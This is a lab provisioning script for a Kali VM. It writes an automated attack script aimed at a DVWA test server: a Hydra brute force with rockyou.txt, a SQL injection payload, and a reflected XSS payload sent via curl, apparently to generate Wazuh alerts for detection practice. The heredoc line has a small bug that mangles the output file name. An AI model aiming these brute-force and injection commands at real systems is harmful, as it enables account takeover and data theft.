#!/usr/bin/env bash
set -e

USER_HOME="/home/vagrant"
ATTACK_SCRIPT="$USER_HOME/dvwa_attack.sh"
DVWA_IP="192.168.56.20"

echo "[+] Updating Kali packages..."
apt update -y
apt upgrade -y

echo "[+] Installing required tools..."
apt install -y hydra curl wordlists

echo "[+] Preparing wordlists..."
if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
    echo "[+] Extracting rockyou.txt..."
    gunzip /usr/share/wordlists/rockyou.txt.gz
fi

echo "[+] Creating automated DVWA attack script at $ATTACK_SCRIPT..."

cat <<EOF > "$ATTACK_SCRIPT"#!/usr/bin/env bash

'''
Attacks ran against DVWA:

    1. Brute-force login ( ctl+c to cancel and proceed with the rest )
    2. SQL Injection
    3. Reflected XSS

Many write-ups have exploits and walkthroughs to use online! Test and see what Wazuh picks up and *what they look like* as alerts
'''

set -e

DVWA_IP="192.168.56.20"

echo "[+] Starting automated DVWA attack sequence..."
echo "[+] Target: $DVWA_IP"


# 1. Brute-force login w/ Hydra
echo "[+] Running Hydra brute-force attack..."
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    $DVWA_IP http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
    -t 4 -f -V || true

# 2. SQL Injection
echo "[+] Triggering SQL Injection..."

SQLI_PAYLOAD="1%27%20OR%20%271%27=%271"

curl -s "http://$DVWA_IP/vulnerabilities/sqli/?id=$SQLI_PAYLOAD&Submit=Submit#" \
  -H "Cookie: security=low; PHPSESSID=12345" \
  -o /dev/null


# 3. Reflected XSS
echo "[+] Triggering XSS..."

XSS_PAYLOAD="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"

curl -s "http://$DVWA_IP/vulnerabilities/xss_r/?name=$XSS_PAYLOAD" \
  -H "Cookie: security=low; PHPSESSID=12345" \
  -o /dev/null


echo "[+] Attack sequence complete."
echo "[+] Check Wazuh for new alerts! :P"

EOF

echo "[+] Setting permissions on attack script..."
chmod +x "$ATTACK_SCRIPT"
chown vagrant:vagrant "$ATTACK_SCRIPT"

echo "[+] Kali provisioning complete. Attack script ready at $ATTACK_SCRIPT"
